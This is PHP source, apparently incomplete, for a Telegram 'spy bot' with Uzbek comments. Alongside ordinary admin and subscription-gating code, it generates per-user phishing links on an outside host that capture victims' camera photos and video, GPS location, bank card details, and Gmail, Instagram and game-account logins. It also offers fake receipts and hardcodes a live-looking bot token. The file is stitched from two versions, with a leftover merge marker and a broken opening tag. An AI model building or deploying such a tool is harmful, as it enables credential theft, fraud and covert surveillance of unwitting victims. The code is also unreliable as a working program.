            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➖ <b>Admin o'chirish</b>\n\nO'chirilishi kerak bo'lgan admin ID raqamini yuboring:",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'remove_admin');
        exit();
    }
    
    // ADMINLAR RO'YXATI
    if ($data == 'list_admins') {
        $admins = getAdmins();
        $admin_text = "👥 <b>Adminlar ro'yxati</b>\n\n";
        foreach ($admins as $admin) {
            $admin_text .= "• <code>$admin</code>\n";
        }
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => $admin_text,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [[['text' => '🔙 Orqaga', 'callback_data' => 'back_to_admins', 'style' => "danger"]]]
            ])
        ]);
        exit();
    }
    
    // ORQAGA (adminlar)
    if ($data == 'back_to_admins') {
        $admins = getAdmins();
        $admin_text = "👥 <b>Adminlar ro'yxati</b>\n\n";
        foreach ($admins as $admin) {
            $admin_text .= "• <code>$admin</code>\n";
        }
        
        $keyboard = [];
        if ($uid2 == $admin_id) {
            $keyboard[] = [['text' => '➕ Admin qo\'shish', 'callback_data' => 'add_admin']];
            $keyboard[] = [['text' => '➖ Admin o\'chirish', 'callback_data' => 'remove_admin']];
        }
        $keyboard[] = [['text' => '📋 Adminlar ro\'yxati', 'callback_data' => 'list_admins']];
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => $admin_text,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
        ]);
        exit();
    }
    
    // OMMAVIY KANAL QO'SHISH
    if ($data == 'add_public' && isAdmin($uid2)) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➕ <b>Ommaviy kanal qo'shish</b>\n\nKanal username yuboring:\n\nMisol: <code>test_channel</code>",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'add_public');
        exit();
    }
    
    // MAXFIY KANAL QO'SHISH
    if ($data == 'add_private' && isAdmin($uid2)) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➕ <b>Maxfiy kanal qo'shish</b>\n\nKanal ma'lumotlarini quyidagi formatda yuboring:\n\n"
                    . "<code>link|chat_id</code>\n\n"
                    . "<b>Misol:</b> <code>https://t.me/+AbCdEfGhIjKlMnOp|-1001234567890</code>",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'add_private');
        exit();
    }
    
    // KANAL O'CHIRISH
    if ($data == 'remove_channel' && isAdmin($uid2)) {
        $channels = getChannels();
        if (empty($channels)) {
            bot('answerCallbackQuery', [
                'callback_query_id' => $qid,
                'text' => 'Kanallar mavjud emas!',
                'show_alert' => true
            ]);
            exit();
        }
        
        $channels_text = "➖ <b>Kanal o'chirish</b>\n\nO'chirish uchun kanal raqamini yuboring:\n\n";
        foreach ($channels as $index => $channel) {
            $number = $index + 1;
            if ($channel['type'] == 'public') {
                $channels_text .= "$number. 🌐 @" . $channel['username'] . "\n";
            } else {
                $channels_text .= "$number. 🔒 Maxfiy kanal (ID: " . $channel['chat_id'] . ")\n";
            }
        }
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => $channels_text,
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'remove_channel');
        exit();
    }
}

// ========== CHAT JOIN REQUEST HANDLER ==========
if ($chat_join_request) {
    $join_chat_id = $chat_join_request['chat']['id'];
    $join_user_id = $chat_join_request['from']['id'];
    
    // Maxfiy kanal qo'shilish so'rovi
    $tizim_dir = "tizim";
    if (!is_dir($tizim_dir)) mkdir($tizim_dir, 0777, true);
    
    $fayl_nomi = "$tizim_dir/$join_chat_id.txt";
    $ids = [];
    if (file_exists($fayl_nomi)) {
        $ids = file($fayl_nomi, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    
    if (!in_array($join_user_id, $ids)) {
        $ids[] = $join_user_id;
        file_put_contents($fayl_nomi, implode(PHP_EOL, $ids) . PHP_EOL);
        
        bot('sendMessage', [
            'chat_id' => $join_user_id,
            'text' => "<b>✅ Kanalga qo'shildingiz!\n\n/start - bosing va kerakli menuni tanlang!</b>",
            'parse_mode' => 'HTML'
        ]);
    }
    exit();
}

// ========== DEFAULT RESPONSE ==========
echo "OK";
=======
<?ph
// ============================================
// SHpion Bot - Mukammal versiya (TO'LIQ)
// ============================================

ob_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Tashkent');

// ========== KONFIGURATSIYA ==========
define('BOT_TOKEN', '8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4');
$admin_id = "6355289079"; // Asosiy admin ID

// ========== FUNKSIYALAR ==========

// Telegram API so'rovi
function bot($method, $data = []) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Agar data bo'sh bo'lmasa, POST qilamiz
    if (!empty($data)) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($ch);
    
    if (curl_error($ch)) {
        file_put_contents('logs/curl_errors.txt', date('Y-m-d H:i:s') . " - " . curl_error($ch) . PHP_EOL, FILE_APPEND);
        return (object)['ok' => false, 'error' => curl_error($ch)];
    }
    
    curl_close($ch);
    return json_decode($res);
}

// Foydalanuvchi stepini saqlash
function setUserStep($user_id, $step, $temp_data = '') {
    $dir = "step";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $file = "$dir/$user_id.step";
    $temp_file = "$dir/$user_id.temp";
    
    if ($step == '' || $step == null) {
        if (file_exists($file)) {
            @unlink($file);
        }
        if (file_exists($temp_file)) {
            @unlink($temp_file);
        }
    } else {
        file_put_contents($file, $step);
        if ($temp_data !== '') {
            file_put_contents($temp_file, $temp_data);
        }
    }
}

// Foydalanuvchi stepini olish
function getUserStep($user_id) {
    $file = "step/$user_id.step";
    if (file_exists($file)) {
        return trim(file_get_contents($file));
    }
    return '';
}

// Foydalanuvchi temp ma'lumotini olish
function getUserTemp($user_id) {
    $file = "step/$user_id.temp";
    if (file_exists($file)) {
        return trim(file_get_contents($file));
    }
    return '';
}

// Majburiy obuna tekshirish
function checkSubscription($user_id) {
    $buttons = [];
    
    // 📌 Ommaviy kanallarni tekshirish
    $kanallar = @file_get_contents("channel.txt");
    if ($kanallar) {
        $ex = explode("\n", trim($kanallar));
        foreach ($ex as $line) {
            $line = trim($line);
            if (!$line) continue;
            
            // Kanal username ni olish
            $channel_username = $line;
            if (strpos($channel_username, '@') === 0) {
                $channel_username = substr($channel_username, 1);
            }
            
            // Kanal nomini olish
            $chat_info = bot('getChat', ['chat_id' => "@" . $channel_username]);
            $ism = $chat_info->result->title ?? $channel_username;
            
            // Obunani tekshirish
            $ret = bot("getChatMember", [
                "chat_id" => "@$channel_username",
                "user_id" => $user_id,
            ]);
            
            $stat = $ret->result->status ?? 'left';
            if (!in_array($stat, ["creator", "administrator", "member"])) {
                $buttons[] = [['text' => "❌ " . $ism, 'url' => "https://t.me/$channel_username", 'style' => "success"]];
            }
        }
    }
    
    // 📌 Maxfiy kanallarni tekshirish
    $maxfiy_kanallar = @file_get_contents("channel2.txt");
    if ($maxfiy_kanallar) {
        $ex = explode("\n", trim($maxfiy_kanallar));
        
        for ($i = 0; $i < count($ex); $i += 2) {
            if (!isset($ex[$i + 1])) continue;
            
            $link = trim($ex[$i]);
            $kanalid = trim($ex[$i + 1]);
            $fayl_nomi = "tizim/$kanalid.txt";
            
            if (!file_exists($fayl_nomi) || !in_array($user_id, explode("\n", trim(file_get_contents($fayl_nomi))))) {
                $buttons[] = [['text' => "❌ Maxfiy kanal", 'url' => $link, 'style' => "primary"]];
            }
        }
    }
    
    if (!empty($buttons)) {
        $buttons[] = [['text' => "🔄 Tekshirish", 'callback_data' => "checksuv", 'style' => "danger"]];
        return [
            'status' => false,
            'buttons' => $buttons
        ];
    }
    
    return ['status' => true];
}

// Asosiy keyboard
function mainKeyboard($is_admin = false) {
    $keyboard = [
        [['text' => "🔐 Xizmatlar"]],
        [['text' => "👤 Profil"], ['text' => "📘 Qoidalar"]],
        [['text' => "📞 Bog'lanish"], ['text' => "💳 To'lov qilish"]],
    ];
    
    if ($is_admin) {
        $keyboard[] = [['text' => "🗄 Boshqaruv paneli"]];
    }
    
    return json_encode([
        'keyboard' => $keyboard,
        'resize_keyboard' => true
    ]);
}

// Orqaga keyboard
function backKeyboard() {
    return json_encode([
        'keyboard' => [[['text' => "◀️ Orqaga", 'style' => "danger"]]],
        'resize_keyboard' => true
    ]);
}

function xizmatlarMen() {
    return json_encode([
        'keyboard' => [[['text' => "💫 Soxta chek"],['text' => "📢 Asosiy xizmatlar"]]],
        'resize_keyboard' => true
    ]);
}


// Foydalanuvchi ma'lumotlarini saqlash
function saveUserData($user_id, $name, $username = '', $phone = '') {
    $dir = "users";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $file = "$dir/$user_id.txt";
    
    // Avvalgi ma'lumotlarni olish
    $old_data = null;
    if (file_exists($file)) {
        $old_data = json_decode(file_get_contents($file), true);
    }
    
    // Agar telefon raqam berilmagan bo'lsa, eski raqamni saqlab qo'yamiz
    $phone_to_save = $phone;
    if ($phone === '' && $old_data && isset($old_data['phone'])) {
        $phone_to_save = $old_data['phone'];
    }
    
    $data = [
        'id' => $user_id,
        'name' => $name,
        'username' => $username,
        'phone' => $phone_to_save, // Telefon raqam majburiy emas
        'first_seen' => $old_data['first_seen'] ?? date('Y-m-d H:i:s'),
        'last_seen' => date('Y-m-d H:i:s'),
        'balance' => $old_data['balance'] ?? 0,
        'stars_balance' => $old_data['stars_balance'] ?? 0
    ];
    
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    // ========== STATISTIKANI FAQAT YANGI FOYDALANUVCHI UCHUN ==========
    if (!$old_data) {
        // Umumiy foydalanuvchilar ro'yxatiga qo'shish
        $all_file = "all_users.txt";
        $all_users = [];
        if (file_exists($all_file)) {
            $all_users = file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        
        if (!in_array($user_id, $all_users)) {
            file_put_contents($all_file, $user_id . PHP_EOL, FILE_APPEND);
        }
        
        // Kunlik statistikaga qo'shish
        $today_file = "stats/" . date('Y-m-d') . ".txt";
        if (!is_dir('stats')) mkdir('stats', 0777, true);
        
        $today_users = [];
        if (file_exists($today_file)) {
            $today_users = file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        
        if (!in_array($user_id, $today_users)) {
            file_put_contents($today_file, $user_id . PHP_EOL, FILE_APPEND);
        }
    }
    
    return $data;
}

// Foydalanuvchi ma'lumotlarini olish
function getUserData($user_id) {
    $file = "users/$user_id.txt";
    if (file_exists($file)) {
        return json_decode(file_get_contents($file), true);
    }
    return null;
}

// Balansni yangilash
function updateBalance($user_id, $amount) {
    $data = getUserData($user_id);
    if ($data) {
        $data['balance'] += $amount;
        $data['last_seen'] = date('Y-m-d H:i:s');
        file_put_contents("users/$user_id.txt", json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        return $data['balance'];
    }
    return 0;
}

// Stars balansini yangilash
function updateStarsBalance($user_id, $amount) {
    $data = getUserData($user_id);
    if ($data) {
        $data['stars_balance'] += $amount;
        $data['last_seen'] = date('Y-m-d H:i:s');
        file_put_contents("users/$user_id.txt", json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        return $data['stars_balance'];
    }
    return 0;
}

// Gift yuborishni yozish
function logGiftSend($from_user_id, $to_user_id, $gift_id, $stars_count, $comment = '') {
    $dir = "gifts";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $log_file = "$dir/" . date('Y-m-d') . ".txt";
    $log_data = date('H:i:s') . " | 👤 $from_user_id → 👤 $to_user_id | 🎁 ID: $gift_id | ⭐️ $stars_count";
    if ($comment) {
        $log_data .= " | 💬 " . substr($comment, 0, 20);
    }
    
    file_put_contents($log_file, $log_data . PHP_EOL, FILE_APPEND);
    
    // Umumiy giftlar hisobi
    $total_file = "$dir/total_gifts.txt";
    $total = 0;
    if (file_exists($total_file)) {
        $total = (int)file_get_contents($total_file);
    }
    $total++;
    file_put_contents($total_file, $total);
}

// Xabar yuborish logi
function logMessageSend($admin_id, $type, $target = 'all', $message = '') {
    $dir = "messages";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $log_file = "$dir/" . date('Y-m-d') . ".txt";
    $log_data = date('H:i:s') . " | 👤 $admin_id | 📤 $type | 🎯 $target";
    if ($message) {
        $log_data .= " | 📝 " . substr($message, 0, 30);
    }
    
    file_put_contents($log_file, $log_data . PHP_EOL, FILE_APPEND);
}

// To'lov logini yozish
function logPayment($user_id, $stars, $amount, $type = 'success') {
    $dir = "payments";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $log_file = "$dir/" . date('Y-m-d') . ".txt";
    $log_data = date('H:i:s') . " | 👤 $user_id | ⭐️ $stars | 💵 $amount so'm | 📊 $type";
    
    file_put_contents($log_file, $log_data . PHP_EOL, FILE_APPEND);
}

// Adminlar ro'yxati
function getAdmins() {
    $file = "admins.txt";
    if (!file_exists($file)) {
        file_put_contents($file, $GLOBALS['admin_id'] . PHP_EOL);
    }
    $admins = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!in_array($GLOBALS['admin_id'], $admins)) {
        $admins[] = $GLOBALS['admin_id'];
    }
    return $admins;
}

// Admin ekanligini tekshirish
function isAdmin($user_id) {
    $admins = getAdmins();
    return in_array($user_id, $admins);
}

// Qoidalarni olish
function getRules() {
    $file = "rules.txt";
    if (!file_exists($file)) {
        $default = "📘 <b>Bot Qoidalari</b>\n\n"
                 . "1. Botdan faqat qonuniy maqsadlarda foydalaning\n"
                 . "2. Boshqa foydalanuvchilarga zarar yetkazmang\n"
                 . "3. Spam xabar yubormang\n"
                 . "4. Adminlarga hurmat ko'rsating";
        file_put_contents($file, $default);
    }
    return file_get_contents($file);
}

// XIZMAT LINK FUNKSIYALARI
function getServiceLink($user_id, $service_type) {
    $base_url = "https://wwwi.qzz.io";
    
    // Qisqa kodlar
        $short_codes = [
        'old_kamera' => 'rm',
        'orqa_kamera' => 'rc',
        'old_video' => 'vd',
        'orqa_video' => 'bc',
        'lokatsiya' => 'lk',
        'bank' => 'bk',
        'freefire' => 'ff',
        'pubg' => 'pg',
        'gmail' => 'gm',
        'instagram' => 'ig'
    ];
    
    if (isset($short_codes[$service_type])) {
        return "$base_url/{$short_codes[$service_type]}/$user_id";
    }
    
    return "$base_url/?id=$user_id";
}

function getServiceName($service_type) {
    $names = [
        'old_kamera' => '📸 Selfie Rasm',
        'orqa_kamera' => '📷 Orqa Kamera Rasm',
        'old_video' => '🎬 Selfie Video',
        'orqa_video' => '🎬 Orqa Kamera Video',
        'lokatsiya' => '📍 GPS Lokatsiya',
        'bank' => '💳 Bank Kartasi',
        'freefire' => '🎮 Free Fire',
        'pubg' => '🎯 PUBG Mobile',
        'gmail' => '📧 Gmail',
        'instagram' => '📷 Instagram'
    ];
    
    return $names[$service_type] ?? 'Noma\'lum xizmat';
}

// Statistikani olish
function getStats() {
    $stats = ['total' => 0, 'today' => 0, 'weekly' => 0, 'total_gifts' => 0, 'total_payments' => 0];
    
    // Jami foydalanuvchilar
    $all_file = "all_users.txt";
    if (file_exists($all_file)) {
        $stats['total'] = count(file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
    }
    
    // Kunlik
    $today_file = "stats/" . date('Y-m-d') . ".txt";
    if (file_exists($today_file)) {
        $stats['today'] = count(file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
    }
    
    // Haftalik
    for ($i = 0; $i < 7; $i++) {
        $date = date('Y-m-d', strtotime("-$i days"));
        $file = "stats/$date.txt";
        if (file_exists($file)) {
            $stats['weekly'] += count(file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
        }
    }
    
    // Jami yuborilgan giftlar
    $gifts_file = "gifts/total_gifts.txt";
    if (file_exists($gifts_file)) {
        $stats['total_gifts'] = (int)file_get_contents($gifts_file);
    }
    
    // Jami to'lovlar
    $payments_dir = "payments";
    if (is_dir($payments_dir)) {
        $files = glob("$payments_dir/*.txt");
        foreach ($files as $file) {
            $stats['total_payments'] += count(file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
        }
    }
    
    return $stats;
}

// Bot holatini olish
function getBotStatus() {
    $file = "bot_status.txt";
    if (!file_exists($file)) {
        file_put_contents($file, 'active');
        return 'active';
    }
    return trim(file_get_contents($file));
}

// Bot holatini o'zgartirish
function setBotStatus($status) {
    $file = "bot_status.txt";
    file_put_contents($file, $status);
    return true;
}

// Kanal ma'lumotlarini olish
function getChannels() {
    $channels = [];
    
    // Ommaviy kanallar
    $public = @file_get_contents("channel.txt");
    if ($public) {
        $lines = explode("\n", trim($public));
        foreach ($lines as $line) {
            $line = trim($line);
            if ($line) {
                $channels[] = [
                    'type' => 'public',
                    'username' => $line,
                    'link' => "https://t.me/" . ltrim($line, '@')
                ];
            }
        }
    }
    
    // Maxfiy kanallar
    $private = @file_get_contents("channel2.txt");
    if ($private) {
        $lines = explode("\n", trim($private));
        for ($i = 0; $i < count($lines); $i += 2) {
            if (isset($lines[$i]) && isset($lines[$i + 1])) {
                $link = trim($lines[$i]);
                $chat_id = trim($lines[$i + 1]);
                $channels[] = [
                    'type' => 'private',
                    'link' => $link,
                    'chat_id' => $chat_id
                ];
            }
        }
    }
    
    return $channels;
}

// ========== YANGI FUNKSIYALAR (TO'LIQ QILINGANLAR) ==========

// Ommaviy kanal qo'shish
function addPublicChannel($username) {
    $file = "channel.txt";
    $channels = [];
    
    if (file_exists($file)) {
        $channels = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    
    // @ belgisini olib tashlash
    $username = ltrim($username, '@');
    
    if (!in_array($username, $channels)) {
        $channels[] = $username;
        file_put_contents($file, implode(PHP_EOL, $channels) . PHP_EOL);
        return true;
    }
    
    return false;
}

// Maxfiy kanal qo'shish
function addPrivateChannel($link, $chat_id) {
    $file = "channel2.txt";
    $channels = [];
    
    if (file_exists($file)) {
        $content = file_get_contents($file);
        $lines = explode("\n", trim($content));
        
        // Link va chat_id juftligini tekshirish
        for ($i = 0; $i < count($lines); $i += 2) {
            if (isset($lines[$i]) && isset($lines[$i + 1])) {
                $existing_link = trim($lines[$i]);
                $existing_chat_id = trim($lines[$i + 1]);
                
                if ($existing_link == $link || $existing_chat_id == $chat_id) {
                    return false; // Kanal allaqachon mavjud
                }
            }
        }
    }
    
    // Yangi kanalni qo'shish
    file_put_contents($file, "$link\n$chat_id\n", FILE_APPEND);
    
    // tizim papkasida fayl yaratish
    $tizim_file = "tizim/$chat_id.txt";
    if (!file_exists($tizim_file)) {
        file_put_contents($tizim_file, "");
    }
    
    return true;
}

// Har bir funksiya uchun majburiy obunani tekshirish
function checkMandatorySubscription($user_id, $admin_check = false) {
    // Agar admin bo'lsa, tekshirish kerak emas
    if ($admin_check && isAdmin($user_id)) {
        return ['status' => true];
    }
    
    return checkSubscription($user_id);
}

// Yoki soddaroq versiya (barcha admin uchun tekshirishsiz):
function checkSubscriptionForAll($user_id) {
    // Adminlar uchun tekshirmaymiz
    if (isAdmin($user_id)) {
        return ['status' => true];
    }
    
    return checkSubscription($user_id);
}

// Kanal o'chirish
function removeChannel($index) {
    $channels = getChannels();
    
    if ($index < 1 || $index > count($channels)) {
        return false;
    }
    
    $channel_to_remove = $channels[$index - 1];
    
    if ($channel_to_remove['type'] == 'public') {
        // Ommaviy kanalni o'chirish
        $file = "channel.txt";
        if (file_exists($file)) {
            $channels_list = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $new_channels = [];
            
            foreach ($channels_list as $channel) {
                if ($channel != $channel_to_remove['username']) {
                    $new_channels[] = $channel;
                }
            }
            
            file_put_contents($file, implode(PHP_EOL, $new_channels) . PHP_EOL);
            return true;
        }
    } else {
        // Maxfiy kanalni o'chirish
        $file = "channel2.txt";
        if (file_exists($file)) {
            $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $new_lines = [];
            
            for ($i = 0; $i < count($lines); $i += 2) {
                if (isset($lines[$i]) && isset($lines[$i + 1])) {
                    $link = trim($lines[$i]);
                    $chat_id = trim($lines[$i + 1]);
                    
                    if ($chat_id != $channel_to_remove['chat_id']) {
                        $new_lines[] = $link;
                        $new_lines[] = $chat_id;
                    } else {
                        // tizim faylini o'chirish
                        $tizim_file = "tizim/$chat_id.txt";
                        if (file_exists($tizim_file)) {
                            @unlink($tizim_file);
                        }
                    }
                }
            }
            
            file_put_contents($file, implode(PHP_EOL, $new_lines) . PHP_EOL);
            return true;
        }
    }
    
    return false;
}

// Admin qo'shish
function addAdmin($admin_id) {
    $file = "admins.txt";
    $admins = getAdmins();
    
    if (!in_array($admin_id, $admins)) {
        $admins[] = $admin_id;
        file_put_contents($file, implode(PHP_EOL, $admins) . PHP_EOL);
        return true;
    }
    
    return false;
}

// Admin o'chirish
function removeAdmin($admin_id) {
    if ($admin_id == $GLOBALS['admin_id']) {
        return false; // Asosiy adminni o'chirish mumkin emas
    }
    
    $file = "admins.txt";
    $admins = getAdmins();
    $new_admins = [];
    
    foreach ($admins as $admin) {
        if ($admin != $admin_id) {
            $new_admins[] = $admin;
        }
    }
    
    file_put_contents($file, implode(PHP_EOL, $new_admins) . PHP_EOL);
    return true;
}

// ========== BARCHA MESSAGE HANDLERLARDAN OLDIN ==========
if ($message) {
    $cid = $message['chat']['id'];
    $uid = $message['from']['id'];
    $text = $message['text'] ?? '';
    // ... boshqa o'zgaruvchilar
    
    // ========== MAJBURIY OBUNA TEKSHIRISH (ADMINDAN TASHQARI BARCHA UCHUN) ==========
    // Faqat admin emas va start yoki bekor qilish emas bo'lsa
    if (!isAdmin($uid) && $text != '/start' && $text != "❌ Bekor qilish" && $text != "◀️ Orqaga") {
        $subscription = checkSubscription($uid);
        if (!$subscription['status']) {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                        . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
                'parse_mode' => 'html',
                'disable_web_page_preview' => true,
                'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
            ]);
            exit();
        }
    }
    
    // Bot holatini tekshirish (oldingi kod)
    $bot_status = getBotStatus();
    // ... qolgan kod
}

// ========== ASOSIY KOD ==========

// Logs papkasini yaratish
if (!is_dir('logs')) mkdir('logs', 0777, true);
if (!is_dir('tizim')) mkdir('tizim', 0777, true);
if (!is_dir('gifts')) mkdir('gifts', 0777, true);
if (!is_dir('messages')) mkdir('messages', 0777, true);
if (!is_dir('users')) mkdir('users', 0777, true);
if (!is_dir('step')) mkdir('step', 0777, true);
if (!is_dir('payments')) mkdir('payments', 0777, true);
if (!is_dir('stats')) mkdir('stats', 0777, true);

$update = json_decode(file_get_contents('php://input'), true);

if (!$update) {
    if ($_SERVER['REQUEST_METHOD'] == 'GET') {
        echo "Bot is running! " . date('Y-m-d H:i:s');
    }
    exit();
}

// Update turlarini olish
$message = $update['message'] ?? null;
$callback_query = $update['callback_query'] ?? null;
$pre_checkout_query = $update['pre_checkout_query'] ?? null;
$chat_join_request = $update['chat_join_request'] ?? null;

// ========== MESSAGE HANDLER ==========
if ($message) {
    $cid = $message['chat']['id'];
    $uid = $message['from']['id'];
    $text = $message['text'] ?? '';
    $name = $message['from']['first_name'] ?? '';
    $last_name = $message['from']['last_name'] ?? '';
    $username = $message['from']['username'] ?? '';
    $contact = $message['contact'] ?? null;
    $full_name = trim("$name $last_name");
    $user_link = "<a href='tg://user?id=$uid'>$full_name</a>";
    
    // Bot holatini tekshirish
    $bot_status = getBotStatus();
    
    if ($bot_status == 'inactive' && !isAdmin($uid) && $text != '/start') {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⏸ <b>Bot vaqtincha to'xtatilgan!</b>\n\nIltimos, keyinroq urinib ko'ring.",
            'parse_mode' => 'HTML'
        ]);
        exit();
    }
// START komandasi - TELEFON RAQAMSIZ VERSIYA
if ($text == '/start') {
    // 1️⃣ Foydalanuvchi bazada bormi tekshirish
    $user_data = getUserData($uid);
    
    // 2️⃣ AGAR USER YANGI BO'LSA → STATISTIKA +1
    if (!$user_data) {
        // Umumiy userlar
        $all_file = "all_users.txt";
        $all_users = [];
        if (file_exists($all_file)) {
            $all_users = file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        
        if (!in_array($uid, $all_users)) {
            file_put_contents($all_file, $uid . PHP_EOL, FILE_APPEND);
        }
        
        // Kunlik statistika
        $stats_file = 'stats/' . date('Y-m-d') . '.txt';
        if (!file_exists($stats_file)) {
            file_put_contents($stats_file, $uid . PHP_EOL);
        } else {
            $today_users = file($stats_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (!in_array($uid, $today_users)) {
                file_put_contents($stats_file, $uid . PHP_EOL, FILE_APPEND);
            }
        }
    }
    
    // 3. Majburiy obuna tekshiruvi
    $subscription = checkSubscription($uid);
    
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "👋 <b>Shpion botga xush kelibsiz, $user_link!</b>\n\n"
                    . "⚠️ <b>Botdan to'liq foydalanish uchun quyidagi kanallarga obuna bo'ling!</b>\n\n"
                    . "Kanallarga obuna bo'lgach, \"🔄 Tekshirish\" tugmasini bosing.",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        setUserStep($uid, 'checking_subscription');
        exit();
    }
    
    // 4. Foydalanuvchi ma'lumotlarini yangilash (telefon raqamsiz)
    saveUserData($uid, $full_name, $username, '');
    
    setUserStep($uid, '');
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "👋 <b>Shpion botga xush kelibsiz, $user_link!</b>\n\n"
                . "✅ <b>Barcha kanallarga obuna bo'ldingiz!</b>\n\n"
                . "🎉 <b>Ro'yxatdan muvaffaqiyatli o'tdingiz!</b>\n\n"
                . "<blockquote>✅ <b>Obunangiz tasdiqlandi!\n\n"
                . "Botning qoidalariga amal qilgan holda barcha funksiyalardan foydalanishingiz mumkin.\n\n"
                . "Botdan foydalanishni boshlaganingiz qonun qoidalarga rioya qilganingizdan dalolat beradi.\n\n"
                . "Bot qoidalari @FoydalanishQoidalari kanalida va botning \"📘 Qoidalar\" bo'limida keltirib o'tilgan</b></blockquote>",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    exit();
}

// ========== QAYTA TEKSHIRISH CALLBACK ==========
if ($user_step == 'checking_subscription') {
    $subscription = checkSubscription($uid);
    
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Hali barcha kanallarga obuna bo'lmagansiz!</b>\n\n"
                    . "Iltimos, kanallarga obuna bo'ling va \"🔄 Tekshirish\" tugmasini bosing.",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
    // Foydalanuvchi ma'lumotlarini yangilash
    saveUserData($uid, $full_name, $username, '');
    
    setUserStep($uid, '');
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "✅ <b>Obunangiz tasdiqlandi!</b>\n\n"
                . "👋 <b>Shpion botga xush kelibsiz, $user_link!</b>\n\n"
                . "🎉 <b>Ro'yxatdan muvaffaqiyatli o'tdingiz!</b>\n\n"
                . "<blockquote>✅ <b>Obunangiz tasdiqlandi!\n\n"
                . "Botning qoidalariga amal qilgan holda barcha funksiyalardan foydalanishingiz mumkin.\n\n"
                . "Botdan foydalanishni boshlaganingiz qonun qoidalarga rioya qilganingizdan dalolat beradi.\n\n"
                . "Bot qoidalari @FoydalanishQoidalari kanalida va botning \"📘 Qoidalar\" bo'limida keltirib o'tilgan</b></blockquote>",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    exit();
}
    

    

    
    // ========== GIFT YUBORISH TIZIMI ==========
    if ($text == "/gift" && isAdmin($uid)) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "🎁 <b>Sovg'a yuborish bo'limi</b>\n\nKimga yubormoqchisiz? Foydalanuvchi <b>ID</b> sini yuboring:",
            'parse_mode' => 'HTML',
            'reply_markup' => backKeyboard()
        ]);
        setUserStep($uid, 'waiting_gift_id');
        exit();
    }
    
    // Gift ID ni qabul qilish
    if ($user_step == 'waiting_gift_id' && isAdmin($uid)) {
        if ($text == "◀️ Orqaga") {
            setUserStep($uid, '');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Sovg'a yuborish bekor qilindi</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
            exit();
        }
        
